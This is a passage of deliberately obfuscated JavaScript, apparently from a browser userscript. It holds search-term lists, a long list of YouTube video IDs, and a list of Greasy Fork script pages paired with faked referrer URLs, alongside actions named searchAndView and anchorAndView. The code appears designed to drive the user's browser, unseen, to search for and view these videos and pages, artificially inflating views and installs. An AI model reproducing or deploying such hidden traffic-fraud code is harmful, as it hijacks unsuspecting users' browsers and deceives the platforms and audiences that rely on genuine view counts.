'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1b56 + -0xd * 0x290 + 0x604)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x11be + -0x1 * 0x194e + 0x79a)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x6c0 + 0x18d6 + 0x1f93 * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    Z(0xe) + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    X(0x7, '(Bi3') + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    X(0x11, '*QnG') + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x13, '*QnG') + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x2)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
